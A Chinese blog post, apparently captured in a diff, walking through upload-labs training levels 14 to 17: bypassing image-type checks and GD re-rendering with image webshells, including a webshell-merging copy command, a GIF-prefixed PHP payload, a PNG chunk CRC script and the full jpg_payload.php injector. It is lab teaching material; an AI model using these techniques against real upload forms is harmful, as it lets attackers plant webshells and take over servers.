@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>pass-14~pass-17 |  云芽的博客</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="云芽的博客" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-upload-labs通关指南/pass-14~pass-17"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  pass-14~pass-17
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/02/05/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-14~pass-17/" class="article-date">
+  <time datetime="2022-02-05T13:52:00.000Z" itemprop="datePublished">2022-02-05</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/">upload-labs通关指南</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">11 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="upload-labs靶场"><a href="#upload-labs靶场" class="headerlink" title="upload-labs靶场"></a>upload-labs靶场</h3><p>备注：解题方法还未实践</p>
+<h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p><strong>题目</strong>：</p>
+<img src="/images/image-20220206184853676.png" alt="image-20220206184853676" style="zoom: 55%;" />
+
+<p><strong>解题</strong>：（图片马绕过）</p>
+<p>源代码：</p>
+<pre><code class="php">function getReailFileType($filename)&#123;
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    
+    $fileType = &#39;&#39;;    
+    switch($typeCode)&#123;      
+        case 255216:            
+            $fileType = &#39;jpg&#39;;
+            break;
+        case 13780:            
+            $fileType = &#39;png&#39;;
+            break;        
+        case 7173:            
+            $fileType = &#39;gif&#39;;
+            break;
+        default:            
+            $fileType = &#39;unknown&#39;;
+        &#125;    
+        return $fileType;
+&#125;
+</code></pre>
+<p>文件包含漏洞：</p>
+<img src="/images/image-20220206185047597.png" alt="image-20220206185047597" style="zoom:50%;" />
+
+<p>方法一：jpg/png</p>
+<p>将普通图片common.jpg和一句话木马文件webshell.php放在同一个文件夹下面，在目录栏输入cmd进入目录下的任务管理器，然后输入<code>copy common.jpg/b + webshell.php/a pass14.png</code>表示将php一句话追加到jpg图片末尾即将文件b：common.jpg与文件a：webshell.php合成为文件pass14.png，这时可以看见文件夹多了一个文件pass14.png，图片马制作完成可以直接上传</p>
+<p>备注：此处合成不可以调换顺序，因为源码会进行前两字节的检测，如果php代码在前面则无法上传成功</p>
+<p>方法二：gif</p>
+<p>先创建一个txt文件，内容如下（php部分可更改），而后更改后缀为.gif进行上传即可</p>
+<pre><code class="php">GIF89a
+&lt;?php
+phpinfo();
+?&gt;
+</code></pre>
+<p>上传完成后右击图片复制链接，访问<code>本地ip/upload/include.php?file=upload/图片链接中名称.jpg部分</code>可解析</p>
+<p>小知识：</p>
+<p>jpg/png图片马和gif图片马差别：png和jpg直接制作图片马上传，gif上传时添加GIF89a即可</p>
+<h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p><strong>解题</strong>：（getimagesize()检测）</p>
+<pre><code class="php">function isImage($filename)&#123;
+    $types = &#39;.jpeg|.png|.gif&#39;;
+    if(file_exists($filename))&#123;
+        $info = getimagesize($filename);
+        $ext = image_type_to_extension($info[2]);
+        if(stripos($types,$ext)&gt;=0)&#123;
+            return $ext;
+        &#125;else&#123;
+            return false;
+        &#125;
+    &#125;else&#123;
+        return false;
+    &#125;
+&#125;
+</code></pre>
+<p>pass15是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass14</p>
+<h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h3><p><strong>解题</strong>：（exif_imagetype()检测）</p>
+<pre><code class="php">function isImage($filename)&#123;
+    //需要开启php_exif模块
+    $image_type = exif_imagetype($filename);
+    switch ($image_type) &#123;
+        case IMAGETYPE_GIF:
+            return &quot;gif&quot;;
+            break;
+        case IMAGETYPE_JPEG:
+            return &quot;jpg&quot;;
+            break;
+        case IMAGETYPE_PNG:
+            return &quot;png&quot;;
+            break;    
+        default:
+            return false;
+            break;
+    &#125;
+&#125;
+</code></pre>
+<p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
+<p>pass16是用php_exif模块判断文件类型，还是可以图片马绕过，方法同pass14</p>
+<h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h3><p><strong>解题</strong>：（二次渲染绕过）</p>
+<pre><code class="php">$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;]))&#123;
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
+    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+
+    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);
+
+    // 获得上传文件的扩展名
+    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))&#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromjpeg($target_path);
+
+            if($im == false)&#123;
+                $msg = &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.jpg&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagejpeg($im,$img_path);
+                @unlink($target_path);
+                $is_upload = true;
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+
+    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))&#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefrompng($target_path);
+
+            if($im == false)&#123;
+                $msg = &quot;该文件不是png格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                 //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.png&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagepng($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;               
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+
+    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))&#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromgif($target_path);
+            if($im == false)&#123;
+                $msg = &quot;该文件不是gif格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.gif&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagegif($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+    &#125;else&#123;
+        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>方法一：gif</p>
+<p>将图片上传到服务器后文件经过二次渲染文件名改变且插在末尾的的webshell代码被删除，用十六进制软件打开文件寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将webshell代码插入其中保存后重新上传即可。</p>
+<p>方法二：png</p>
+<p>png图片资料参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a>   <a target="_blank" rel="noopener" href="https://my.oschina.net/ososchina/blog/801358">https://my.oschina.net/ososchina/blog/801358</a></p>
+<p>在网上找到了两种方式来制作绕过二次渲染的png木马.</p>
+<ol>
+<li><p>写入PLTE数据块</p>
+<p>php底层在对PLTE数据块验证的时候，主要进行了CRC校验，所以可以在chunk data域插入php代码，然后重新计算相应的crc值并修改即可。这种方式只针对索引彩色图像的png图片才有效，在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
+<p>1）在PLTE数据块写入php代码</p>
+<img src="/images/image-20220206214114940.png" alt="image-20220206214114940" style="zoom:50%;" />
+
+<p>2）计算PLTE数据块的CRC，CRC脚本如下</p>
+<pre><code class="python">import binascii
+import re
+
+png = open(r&#39;2.png&#39;,&#39;rb&#39;)
+a = png.read()
+png.close()
+hexstr = binascii.b2a_hex(a)
+
+&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
+data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
+crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
+print hex(crc)
+</code></pre>
+<p>运行结果：526579b0</p>
+<p> 3）修改CRC值</p>
+<img src="/images/image-20220206214923679.png" alt="image-20220206214923679" style="zoom: 55%;" />
+
+<p>4） 将修改后的png图片上传后,下载到本地打开</p>
+</li>
+<li><p>写入IDAT数据块</p>
+<p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
+</li>
+</ol>
+<pre><code class="php">&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+&#125;
+
+imagepng($img,&#39;./1.png&#39;);
+?&gt;
+</code></pre>
+<p>运行后得到1.png.上传后下载到本地打开如下图</p>
+<p>方法三：jpg</p>
+<p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
+<pre><code class="php">&lt;?php
+    /*
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php &lt;jpg_name.jpg&gt;
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+    Sergey Bobrov @Black2Fan.
+
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+    */
+
+    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;
+
+
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
+        die(&#39;php-gd is not installed&#39;);
+    &#125;
+
+    if(!isset($argv[1])) &#123;
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
+    &#125;
+
+    set_error_handler(&quot;custom_error_handler&quot;);
+
+    for($pad = 0; $pad &lt; 1024; $pad++) &#123;
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis-&gt;readShort() != 0xFFD8) &#123;
+            die(&#39;Incorrect SOI marker&#39;);
+        &#125;
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) &#123;
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) &#123;
+                    while((!$dis-&gt;eof())) &#123;
+                        if($dis-&gt;readByte() === 0xFF) &#123;
+                            if($dis-&gt;readByte !== 0x00) &#123;
+                                break;
+                            &#125;
+                        &#125;
+                    &#125;
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                &#125; elseif($correctImage) &#123;
+                    $outStream = $outStreamTmp;
+                &#125; else &#123;
+                    break;
+                &#125;
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
+                    die(&#39;Success!&#39;);
+                &#125; else &#123;
+                    break;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+    unlink(&#39;payload_&#39;.$argv[1]);
+    die(&#39;Something\&#39;s wrong&#39;);
+
+    function checkImage($filename, $data, $unlink = FALSE) &#123;
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    &#125;
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;
+            if(isset($m[1])) &#123;
+                $extraBytes = (int)$m[1];
+            &#125;
+        &#125;
+    &#125;
+
+    class DataInputStream &#123;
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) &#123;
+            $this-&gt;binData = &#39;&#39;;
+            $this-&gt;order = $order;
+            if(!$fromString) &#123;
+                if(!file_exists($filename) || !is_file($filename))
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+                $this-&gt;binData = file_get_contents($filename);
+            &#125; else &#123;
+                $this-&gt;binData = $filename;
+            &#125;
+            $this-&gt;size = strlen($this-&gt;binData);
+        &#125;
+
+        public function seek() &#123;
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        &#125;
+
+        public function skip($skip) &#123;
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        &#125;
+
+        public function readByte() &#123;
+            if($this-&gt;eof()) &#123;
+                die(&#39;End Of File&#39;);
+            &#125;
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        &#125;
+
+        public function readShort() &#123;
+            if(strlen($this-&gt;binData) &lt; 2) &#123;
+                die(&#39;End Of File&#39;);
+            &#125;
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) &#123;
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            &#125; else &#123;
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            &#125;
+            return $short;
+        &#125;
+
+        public function eof() &#123;
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        &#125;
+    &#125;
+?&gt;
+</code></pre>
+<p>将jpg图片上传至服务器后下载到本地保存为<code>1.jpg</code>，用脚本处理1.jpg，命令<code>php jpg_payload.php 1.jpg</code>，使用16进制编辑器打开就可以看到插入的php代码，将生成的<code>payload_1.jpg</code>上传即可</p>
+<img src="/images/image-20220206215839769.png" alt="image-20220206215839769" style="zoom:50%;" />
+
+<p>需要注意的是，有一些jpg图片不能被处理，所以需要多尝试一些jpg图片。</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/02/05/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-14~pass-17/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/02/06/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-18~pass-21/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            pass-18~pass-21
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/02/03/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-11~pass-13/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">pass-11~pass-13</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2022
+        <i class="ri-heart-fill heart_icon"></i> yunya
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="云芽的博客"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
